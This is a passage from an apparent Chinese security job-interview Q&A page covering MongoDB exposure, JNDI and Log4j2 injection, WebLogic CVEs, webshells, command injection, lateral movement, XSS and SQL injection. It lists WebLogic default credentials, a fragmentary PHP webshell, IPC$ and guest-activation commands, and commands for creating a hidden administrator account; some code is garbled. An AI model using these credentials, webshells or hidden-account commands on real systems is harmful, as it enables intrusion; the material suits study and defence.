href="https://cloud.tencent.com/product/mongodb?from=10680">MongoDB</a> 服务安装后，默认未开启权限验证。如果服务监听在 0.0.0.0，则可远程无需授权访问<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>。</p><p>​    3.0 之前版本的 MongoDB, 默认监听在 0.0.0.0，3.0 及之后版本默认监听在 127.0.0.1。</p><p>​    3.0 之前版本，如未添加用户管理员账号及数据库账号，使用 –auth 参数启动时，在本地通过 127.0.0.1 仍可无需账号密码登陆访问数据库，远程访问则提示需认证；</p><p>​    3.0 及之后版本，使用 –auth 参数启动后，无账号则本地和远程均无任何数据库访问权限。</p><h3 id="问三十七：JNDI-注入是什么？"><a href="#问三十七：JNDI-注入是什么？" class="headerlink" title="问三十七：JNDI 注入是什么？"></a>问三十七：JNDI 注入是什么？</h3><p>JNDI RCE 漏洞产生的原因就在于当我们在注册 RMI 服务时，可以指定 Codebase url，也就是远程要加载类的位置，设 置该属性可以让 JDNI 应用程序在加载时去寻找我们指定的类 ( 例如：<a href="http://ip:port/EvilObject.class">http://ip:port/EvilObject.class</a>) 。 </p><p>这里还有一个比较重要的点，也是触发恶意代码的点。就是当 JNDI 应用程序通过 lookup (RMI 服务的地址) 方法调用指 定 Codebase url  上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时， 漏洞就会触发。</p><h3 id="问三十八：讲一下WebLogic-系列漏洞"><a href="#问三十八：讲一下WebLogic-系列漏洞" class="headerlink" title="问三十八：讲一下WebLogic 系列漏洞"></a>问三十八：讲一下WebLogic 系列漏洞</h3><p>Weblogic 漏洞有哪些？</p><p>weblogic 就好多了，基于 T3 协议的反序列化；基于 xml 解析时候造成的反序列化，还有 ssrf，权限绕过等等 </p><pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109Weblogic RCE CVE-2020-14882&amp;14883weblogic jndi注入CVE-2020-14841Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645WebLogic CVE-2020-14756 T3IIOP反序列化RCEWeblogic 远程代码执行漏洞 CVE-2020-2883Weblogic CVE-2020-2551 IIOP协议反序列化rceWeblogic反序列化漏洞 CVE-2019-2890Weblogic反序列化远程代码执行漏洞CVE-2019-2725Weblogic反序列化漏洞 CVE-2019-2729Weblogic任意文件读取漏洞（CVE-2019-2615)）Weblogic 文件上传漏洞（CVE-2019-2618）weblogic 反序列化漏洞 CVE-2018-3252Weblogic反序列化远程代码执行漏洞 CVE-2018-3245Weblogic远程代码执行漏洞 CVE-2018-3191Weblogic任意文件上传漏洞（CVE-2018-2894）Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）Weblogic 反序列化漏洞 CVE-2017-3506Weblogic 反序列化漏洞 CVE-2017-3248Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Weblogic 漏洞扫描工具</li></ul><p>安装工具：</p><ol><li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p></li><li><p>下载 weblogicScanner</p><p><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p></li><li><p>进入 weblogicScanner</p></li><li><p>举例：测试本机是否存在漏洞 <code>python ws.py -t 127.0.0.1</code></p></li></ol><h3 id="问三十九：WebLogic-常用弱口令有哪些？"><a href="#问三十九：WebLogic-常用弱口令有哪些？" class="headerlink" title="问三十九：WebLogic 常用弱口令有哪些？"></a>问三十九：WebLogic 常用弱口令有哪些？</h3><pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123weblogic weblogicguest guestportaladmin portaladminadmin securityjoe passwordmary passwordsystem securitywlcsystem wlcsystemwlcsystem sipisystemsystem password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问四十：简述一下Log4j2-漏洞"><a href="#问四十：简述一下Log4j2-漏洞" class="headerlink" title="问四十：简述一下Log4j2 漏洞"></a>问四十：简述一下Log4j2 漏洞</h3><p>Apache Log4j2 是一个基于 Java 的日志记录工具。Apache Log4j 2.x &lt;= 2.14.1 版本存在远程代码执行漏洞。  漏洞的主要原因是 log4j2  的接收器对于不可靠来源的输入没有过滤，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。由于 Log4j2  组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务器发送恶意的数据，触发 log4j2  组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><p>为了输出日志时能够方便地输出任意位置的 java 对象，Log4j2 引入了一个叫 Lookup  的统一接口。这个接口允许在写日志的时候，按照具体的实现逻辑去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于 java  支持对象的序列化 / 反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p><p>我们提到的 JNDI 就是对 Lookup  接口的一种实现。其本身也是一个接口，提供了命名关键字到对象的映射目录，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即轻量级目录访问协议，是 JNDI 的一种底层实现，它可以让我们方便的查询分布式数据库。既然是分布式的，LDAP  允许从远程服务器加载对象。而这里加载对象时使用的不是一般的反序列化方法，而是通过「命名引用」功能，支持直接从远程下载 class  文件并加载对象。</p><p>于是，Log4j2 中就暗含了注入漏洞：允许传入参数解析为 LDAP 协议，从远程服务器下载 class 文件并执行。这个功能本来是为了方便开发，使 java 对象位置对上层应用透明，却不料酿成大祸</p><h3 id="问四十一：简述Struts2-漏洞"><a href="#问四十一：简述Struts2-漏洞" class="headerlink" title="问四十一：简述Struts2 漏洞"></a>问四十一：简述Struts2 漏洞</h3><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p><h3 id="问四十二：WebShell-的利用"><a href="#问四十二：WebShell-的利用" class="headerlink" title="问四十二：WebShell 的利用"></a>问四十二：WebShell 的利用</h3><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p><p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p><ul><li><p>WebShell 的分类 ①根据文件大小分类：大马和小马 (通常指的是一句话木马，能够使用菜刀这类工具去直接连接它) ②根据脚本名称分类：jsp、asp、aspx、php</p></li><li><p>WebShell 的利用</p><p>寻找页面上传点</p><p>写好一句话木马（上传木马），比如如下的 PHP 一句话木马的代码：</p><p><code>_POST['shell']); ?&gt;</code></p><p>然后寻找上传后的文件位置（绝对路径），可以用蚁剑、中国菜刀等工具连接到主机进行接下来的操作，比如提权。</p></li><li><p>WebShell 有哪些特征？</p><ul><li><p>持久化远程访问</p><p>Webshell 脚本通常会包含后门，黑客上传 Webshell 之后，就可以充分利用 Webshell  的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完 Webshell  之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p></li></ul></li><li><p>提权</p><p>在服务器没有配置错误的情况下，Webshell 将在 web 服务器的用户权限下运行，而用户权限是有限的。通过 Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得  Root 权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p></li><li><p>隐藏性极强</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p></li><li><p>WebShell 常用的 PHP 函数</p><p>Webshell 几乎适用于所有 Web 编程语言。之所以关注 PHP，是因为它是 web 上使用最广泛的编程语言。下面是 PHP 中一些执行 shell 命令最常用的函数。</p><ul><li><p>system()</p><p>system () 函数将命令作为参数，并输出结果。</p><p>下面的示例是在 Windows 操作系统上运行 dir 命令，然后返回 PHP 文件所在目录的目录列表。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo system('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p>exec()</p><p>exec () 功能是将命令作为参数，但不输出结果。</p><p>如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo exce('ls -al');    echo exce('ls -al',$array);    var_dump($array);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>shell_exec()</p><p>shell_exec () 函数类似于 exec ()，但是，其整个输出结果为字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo shell_exce('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>passthru()</p><p>passthru () 执行一个命令并返回原始格式的输出。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo passthru('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>proc_open()</p><p>proc_open () 可以创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</p></li><li><p>倒引号</p><p>PHP 会首先执行 shell 命令中倒引号（`）内的内容</p></li></ul><h3 id="问四十三：序列化与反序列化"><a href="#问四十三：序列化与反序列化" class="headerlink" title="问四十三：序列化与反序列化"></a>问四十三：序列化与反序列化</h3><ul><li>序列化：把对象转化为可传输的字节序列过程称为序列化</li><li>反序列化：把字节序列还原为对象的过程称为反序列</li></ul><h3 id="问四十四：命令执行漏洞是什么"><a href="#问四十四：命令执行漏洞是什么" class="headerlink" title="问四十四：命令执行漏洞是什么"></a>问四十四：命令执行漏洞是什么</h3><p>命令执行漏洞是值攻击者可以随意执行系统命令，它属于高危漏洞之一，也属于代码执行的范畴。命令执行漏洞不仅存在 B/S 架构中，还在 C/S 架构中也常常遇到。</p><p>应用有时需要调用一些执行系统命令的函数，如 PHP 的 system 、exec、shell_exec、passthru、proc_popen  等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p><strong>命令执行漏洞的危害</strong></p><ul><li>继承 web 服务程序的权限去执行系统命令或读写文件</li><li>反弹 Shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><p><strong>命令执行漏洞的原理</strong></p><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、 exec、shell_exec 等，如果用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常的命令中， 造成命令执行漏洞。</p><p>在操作系统中，“&amp;、|、||” 都可以作为命令连接符使用， 用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，从而造成漏洞。</p><p><strong>命令执行漏洞成因</strong></p><ul><li><p>代码层过滤不严格</p><p>商业应用需要执行命令，商业应用的一些核心代码可能在二进制文件当中，在 web 应用中通过 system 函数调用。例如 system (“/bin/program –arg c194a9eg&lt;!– begin-inline-katexarg”);</p></li><li><p>系统漏洞造成命令注入</p></li></ul><p>  例如 bash 破壳漏洞 (CVE-2014-6271)，如果我们控制执行的 bash 的环境变量，就可以通过破壳漏洞来执行任意代码。</p><ul><li><p>第三方组件造成命令注入</p><p>如 Wordpress，可以选择 ImageMagick 这个常用的 图片处理组件，处理用户上传图片时造成命令执行，如 JAVA 中 Struts2/ElasticsearchGroovy 等。</p></li></ul><p><strong>命令执行漏洞常见函数</strong></p><ul><li>System 函数的语法是： system (string $command [, int &amp;end-inline-katex–&gt;return_var ] )<ul><li>同 C 版本的 system () 函数一样</li><li>本函数执行 command 参数所指定的命令，并且输出执行结果</li><li>命令执行后的返回值为输出值的最后一行</li><li>函数本身也会打印全部的输出值</li></ul></li><li>Exec 函数的语法为：exec (string $command [, array &amp;$output [, int &amp;c194a9eg&lt;!– begin-inline-katexreturn_var]] )</li><li>这个函数的作用是执行 command 参数所指定的命令</li><li>命令执行后的值为输出值的最后一行</li><li>函数本身不会打印任何内容</li><li>Passthru 函数的语法为：passthru (string $command [, int &amp;end-inline-katex–&gt;return_var ] )</li><li>同 exec () 函数类似</li><li>passthru () 函数也是用来执行外部命令 command 的</li><li>当所执行的系统命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec () 或 system () 函数。</li><li>Shell_exec 函数的语法为： shell_exec (string $cmd)<ul><li>cmd 是要执行的命令 </li><li>String 是参数的数据类型，也就是字符串。</li><li>函数会在命令执行完成后将全部的输出值作为字符串输入返回值，本身并不打印任何信息。 </li><li>Shell_exec 函数的用法同反引号形同，注意是反引号（``）而不是普通单引号（’’）。</li></ul></li></ul><p><strong>命令执行漏洞连接符</strong></p><p>&amp;: 顺序执行多条命令，而不管命令是否执行成功</p><p>&amp;&amp;: 逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令， 前面的命令执行失败，后面的命令不会执行，与 || 正好相反</p><p>|: 显示后面命令的结果</p><p>||: 逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。 前面的命令执行失败，后面的命令才会执行</p><p><strong>命令执行漏洞防御</strong></p><ul><li><p>不执行外部的应用程序或命令</p><p>尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在 执行 system、eval 等命令执行功能的函数前，要先确定参数内容。</p></li><li><p>使用 escapeshellarg 函数处理相关参数</p><p>Escapeshellarg 函数会将任何引起参数或命令结束的字符进行转义</p></li><li><p>使用 safe_mode_exec_dir 执行可执行的文件路径</p><p>将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文 件路径。</p></li></ul><h3 id="问四十五：Winodws-命令执行漏洞介绍"><a href="#问四十五：Winodws-命令执行漏洞介绍" class="headerlink" title="问四十五：Winodws 命令执行漏洞介绍"></a>问四十五：Winodws 命令执行漏洞介绍</h3><p>Windows 命令执行漏洞，就是在 Winodws 环境下存在的命令执行漏洞，通过相关的漏洞验证方法确认了存在命令执行漏洞后，我们可以使用 Windows 环境下的一些命令去对漏洞进行利用。</p><ul><li>通过涉及到主机探测、扫描、路由、协议、远程、进程、端口、服务等常见的 Windows 的命令</li><li>如果我们的服务器是一台 Windows 操作系统，存在着命令执行漏洞</li><li>我们就可以通过上面的这些漏洞进行命令执行的操作 </li><li>对 Windows 服务器系统进行扫描探测、进行进程和服务管理、进行内网渗透、服务器提限等</li></ul><h3 id="问四十六：Windows-命令执行漏洞利用"><a href="#问四十六：Windows-命令执行漏洞利用" class="headerlink" title="问四十六：Windows 命令执行漏洞利用**"></a>问四十六：Windows 命令执行漏洞利用**</h3><p>通过以上的学习我们知道了 Windows 下的命令执行漏洞的原理以及一些利用方法，下面将列出常用到的 Windows 命令，可以利用到 Windows 命令执行的漏洞当中去。</p><ul><li>ipconfig /all 查看网络连接</li><li>net use \ip\ipc$ “” /user:” “    建立 IPC 空链接</li><li>net use \ip\ipc$ “密码” /user:”用户名” 建立 IPC 非空链接</li><li>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方 C：到本地为 H:</li><li>net use h: \ip\c$ 登陆后映射对方 C：到本地为 H:</li><li>net use \ip\ipc$ /del 删除 IPC 链接</li><li>net use h: /del 删除映射对方到本地的为 H: 的映射</li><li>net user guest /active:yes 激活 guest 用户</li><li>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</li><li>echo 信息 &gt;&gt; pass.txt 将 “信息” 保存到 pass.txt 文件中</li></ul><h3 id="问四十七：Linux-命令执行漏洞"><a href="#问四十七：Linux-命令执行漏洞" class="headerlink" title="问四十七：Linux 命令执行漏洞"></a>问四十七：Linux 命令执行漏洞</h3><ul><li>Linux 命令执行漏洞，就是在 Linux 服务器上存在的命令执行下漏洞</li><li>Linux 命令执行漏洞相对于 Windows 命令执行漏洞来说，利用起来更加的容易</li><li>因为 Linux 的一些操作本省就是需要通过一些命令去进行管理和执行</li></ul><p>命令在 Linux 中的执行分为 4 步：判断路径、检查别名、判断内外部、路径查找文件</p><h3 id="问四十八：Linux-命令执行漏洞Linux-命令执行漏洞利用"><a href="#问四十八：Linux-命令执行漏洞Linux-命令执行漏洞利用" class="headerlink" title="问四十八：Linux 命令执行漏洞Linux 命令执行漏洞利用"></a>问四十八：Linux 命令执行漏洞Linux 命令执行漏洞利用</h3><ul><li>Linux 系统下基本命令，我们注意这些命令要区分大小写</li><li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li><li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li></ul><h1 id="四、内网渗透"><a href="#四、内网渗透" class="headerlink" title="四、内网渗透"></a>四、内网渗透</h1><h3 id="问四十九：内网渗透基本流程"><a href="#问四十九：内网渗透基本流程" class="headerlink" title="问四十九：内网渗透基本流程"></a>问四十九：内网渗透基本流程</h3><p>漏洞挖掘 - 漏洞利用 - 提权准备 - 提权</p><p><img src="/HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/20181201221817863.png" alt="img"></p><p>前提是利用已经控制的一台计算机作为入侵内网的跳板，在其他内网计算机看来访问全部来自于跳板机 (WEB Server)</p><h3 id="问五十：讲一下自己的渗透经验"><a href="#问五十：讲一下自己的渗透经验" class="headerlink" title="问五十：讲一下自己的渗透经验"></a>问五十：讲一下自己的渗透经验</h3><p>查看是否存在一些高危端口，如 443 的心脏滴血，445 的永恒之蓝这两个是我知道的。如果扫到其他端口，那么可以用 metasploit 的 search  命令，去查看是否有相应的漏洞。假如说我们在内网渗透中，通过 nmap 扫到了 samba 服务，那么我们就可以去找一个最新的它的漏洞尝试攻击它。</p><h3 id="问五十一：如何判断网站是否有-CDN？"><a href="#问五十一：如何判断网站是否有-CDN？" class="headerlink" title="问五十一：如何判断网站是否有 CDN？"></a>问五十一：如何判断网站是否有 CDN？</h3><ul><li>传统访问：用户访问域名 –&gt; 解析服务器 IP–&gt; 访问目标主机</li><li>普通 CDN：用户访问域名 –&gt;CDN 节点 –&gt; 真实服务器 IP–&gt; 访问目标主机</li><li>带 WAF 的 CDN：用户访问域名 –&gt;CDN 节点（云 WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</li></ul><p>很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了 CDN</p><p>1、通过 ping 命令，查看回显情况 2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况 3、超级 ping 工具，比如”all-tool.cn/tools   /ping“「看 ip 结果」</p><h3 id="问五十二：如何判断靶标站点是-windows-x2F-linux？"><a href="#问五十二：如何判断靶标站点是-windows-x2F-linux？" class="headerlink" title="问五十二：如何判断靶标站点是 windows/linux？"></a>问五十二：如何判断靶标站点是 windows/linux？</h3><p>1、大小写检测：windows 大小写不敏感，而 linux 大小写敏感。 </p><p>2、PING 指令：根据 TTL 值，winodws 一般情况下 &gt; 100,linux&lt;100 TTL (生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p><h3 id="问五十三：如何建立隐藏用户？"><a href="#问五十三：如何建立隐藏用户？" class="headerlink" title="问五十三：如何建立隐藏用户？"></a>问五十三：如何建立隐藏用户？</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">1、net user test$ 123456 /add [建立隐藏用户]2、net localgroup administrators test$ /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="问五十四：正向代理和反向代理的区别？"><a href="#问五十四：正向代理和反向代理的区别？" class="headerlink" title="问五十四：正向代理和反向代理的区别？"></a>问五十四：正向代理和反向代理的区别？</h3><p>正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p><p>正向 Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。 反向 Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。 正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端. 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p><h3 id="问五十五：横向渗透命令执行手段？"><a href="#问五十五：横向渗透命令执行手段？" class="headerlink" title="问五十五：横向渗透命令执行手段？"></a>问五十五：横向渗透命令执行手段？</h3><p>psexec，wmic，smbexec，winrm，net use 共享 + 计划任务 + type 命令</p><h3 id="问五十六：psexec-和-wmic-或者其他的区别？"><a href="#问五十六：psexec-和-wmic-或者其他的区别？" class="headerlink" title="问五十六：psexec 和 wmic 或者其他的区别？"></a>问五十六：psexec 和 wmic 或者其他的区别？</h3><p>psexec 会记录大量日志，wmic 不会记录下日志。wmic 更为隐蔽</p><h3 id="问五十七：域内攻击方法有了解过吗？"><a href="#问五十七：域内攻击方法有了解过吗？" class="headerlink" title="问五十七：域内攻击方法有了解过吗？"></a>问五十七：域内攻击方法有了解过吗？</h3><p>MS14-068、Roasting 攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay</p><h3 id="问五十八：桌面有管理员会话，想要做会话劫持怎么做？"><a href="#问五十八：桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="问五十八：桌面有管理员会话，想要做会话劫持怎么做？"></a>问五十八：桌面有管理员会话，想要做会话劫持怎么做？</h3><p>提权到 system 权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。</p><p>终端服务会话可以是连接状态也可以是未连接状态（这里当时没答上来，觉得有点鸡肋。我也不知道是不是这个意思）</p><h1 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h1><h3 id="问五十九：OWASP-Top-10"><a href="#问五十九：OWASP-Top-10" class="headerlink" title="问五十九：OWASP Top 10"></a>问五十九：OWASP Top 10</h3><p>web 十大漏洞：</p><p>（1）注入</p><p>（2）失效的身份认证和会话管理 (使用别人会话 id, 包含身份信息信用卡),</p><p>（3）XSS  跨站（存储、反射、dom），</p><p>  (4) 不安全的对象直接引用 (如？id=89 改成？id=90, 可以看到 id=90  的信息)， </p><p>  (5）伪造跨站请求（CSRF 可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点） </p><p>  (6) 安全误配置，</p><p>  (7) 限制  URL 访问失败（缺少功能级访问控制）,</p><p>  (8) 未验证的重定向和转发，</p><p>  (9) 应用已知脆弱性的组件，</p><p>  (10) 敏感信息泄露</p><h3 id="问六十：XSS-和-CSRF-的区别"><a href="#问六十：XSS-和-CSRF-的区别" class="headerlink" title="问六十：XSS 和 CSRF 的区别"></a>问六十：XSS 和 CSRF 的区别</h3><p>名称不同：一个为跨站请求伪造，一个为跨站脚本请求</p><p>危害不同：csrf 是伪造其他网站的操作，冒用身份比如利用 cookie，伪造登录凭证，无法直接窃取用户 cookie，而 xss 可以编写 payload 导致用户 cookie 直接被攻击者所窃取；</p><p>分类不同：xss 有三种分类，csrf 无分类；</p><h3 id="问六十一：XSS-是什么"><a href="#问六十一：XSS-是什么" class="headerlink" title="问六十一：XSS 是什么"></a>问六十一：XSS 是什么</h3><p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p><p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p><p>当用户访问被 XSS 注入的网页，XSS 代码就会被提取出来 用户浏览器就会解析这段 XSS 代码，也就是说用户被攻击了  用户最简单的动作就是使用浏览器上网，并且浏览器中有 javascript 解释器， 可以解析  javascript，然而浏览器不会判断代码是否恶意。</p><p>微博、留言板、聊天室等等收集用户输入的地方， 都有遭受 XSS 的风险，只要没有对用户的输入进行严格过滤，就会被 XSS 。</p><h3 id="问六十二：XSS-漏洞危害"><a href="#问六十二：XSS-漏洞危害" class="headerlink" title="问六十二：XSS 漏洞危害"></a>问六十二：XSS 漏洞危害</h3><ul><li>盗取各种用户账号 </li><li>窃取用户 Cookie 资料，冒充用户身份进入网站 </li><li>劫持用户会话，执行任意操作 </li><li>刷流量，执行弹窗广告 </li><li>传播蠕虫病毒</li></ul><h3 id="问六十三：XSS-漏洞类型"><a href="#问六十三：XSS-漏洞类型" class="headerlink" title="问六十三：XSS 漏洞类型"></a>问六十三：XSS 漏洞类型</h3><ul><li><p>反射型 XSS</p><p>搜索框，用户登录 </p><p>非持久性、参数跨站脚本 </p><p>窃取用户 cookie 或进行钓鱼欺骗</p></li><li><p>存储型 XSS</p><p>留言板，评论，博客日志 </p><p>持久性跨站脚本，更具威胁性 </p><p>渗透网站、挂马、蠕虫病毒、钓鱼</p></li><li><p>DOM 型 XSS</p></li></ul>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'&gt;testLink&lt;/a&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>write<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="问六十四：SQL-注入的本质"><a href="#问六十四：SQL-注入的本质" class="headerlink" title="问六十四：SQL 注入的本质"></a>问六十四：SQL 注入的本质</h3><p>把用户输入的数据当作代码执行。 </p><p>包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。</p><h3 id="问六十五：SQL-注入经常出现的地方"><a href="#问六十五：SQL-注入经常出现的地方" class="headerlink" title="问六十五：SQL 注入经常出现的地方"></a>问六十五：SQL 注入经常出现的地方</h3><ul><li><p>内部实现 / 流程的角度</p><p>url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…</p></li><li><p>业务点</p></li></ul><p>  新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…</p><p>简言之：一切可以与数据库进行交互的地方。</p><h3 id="问六十六：SQL-注入的分类"><a 